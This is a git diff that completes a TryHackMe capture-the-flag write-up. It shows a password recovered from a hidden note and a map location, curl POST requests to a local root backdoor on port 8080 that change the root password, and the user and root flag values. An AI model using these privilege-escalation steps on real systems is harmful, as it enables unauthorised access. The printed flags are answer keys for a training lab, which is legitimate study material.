@@ -208,20 +208,33 @@ make
 ./exploit 0
 ```
 
-maybe it's not work, a bad experience
+maybe it's not work, a bad experience with a lab...
 
 after login to `adam` with our cracked password, look at Desktop has a archive folder
 
 ```
-cat /home/adam/Desktop/.archive/to_my_best_friend_adam.txt 
-do you remember our place 
-i love there it's soo calming
-i will make that lights my password--https://www.google.com/maps/@68.5090469,27.481808,3a,75y,313.8h,103.6t/data=!3m6!1e1!3m4!1skJPO1zlKRtMAAAQZLDcQIQ!3e2!7i10000!8i5000
+cat /home/adam/Desktop/.archive/to_my_best_friend_adam.txt
 ```
+
+![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/8683d644-9f33-4047-9861-c724b8603426)
+
+it's a google map place
 
 ![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/3bed9887-1631-4177-94d1-15af87221087)
 
-check `netstat -a` returns a service running on `http://127.0.0.1:8080`
+so, login to `mason` with password `northernlights` (lowercase and remove spaces)
+
+![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/34b05b6e-7250-40a4-8b94-4027be6a9c9f)
+
+| Flag | user.txt |
+| --- | --- |
+| Answer | thm{23cd53cbb37a37a74d4425b703d91883} |
+
+## Privilege Escalation
+
+check `netstat -a` returns a service of root running on `http://127.0.0.1:8080`
+
+![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/bf75f462-6f3a-4647-b90a-d6847dd9da91)
 
 ```
 curl http://127.0.0.1:8080/
@@ -229,16 +242,30 @@ curl http://127.0.0.1:8080/
 
 ![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/60e7a3ea-5c38-46ae-9d02-e16068a73d1f)
 
-curl -X POST -F "password=Lights" -F "cmdtype=passwd" http://127.0.0.1:8080/passwd
+it seem a mason's backdoor
 
-| Flag | user.txt |
+```
+curl http://127.0.0.1:8080/ -X POST -d "password=northernlights&cmdtype=lsla"
+```
+
+![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/a16b615b-bcdf-499b-adf5-5928227eec3f)
+
+change password
+
+```
+curl http://127.0.0.1:8080/ -X POST -d "password=northernlights&cmdtype=passwd"
+```
+
+![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/80100345-17c1-46b8-995b-4000fa8ee33a)
+
+```
+su root
+northernlights
+cat /root/r00t.txt
+```
+
+![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/898df055-7f3f-443b-99e4-c9319e12e70c)
+
+| Flag | r00t.txt |
 | --- | --- |
-| Answer | <flag> |
-
-## Privilege Escalation
-
-.
-
-| Flag | root.txt |
-| --- | --- |
-| Answer | <flag> |
+| Answer | thm{ad23b9c63602960371b50c7a697265db} |
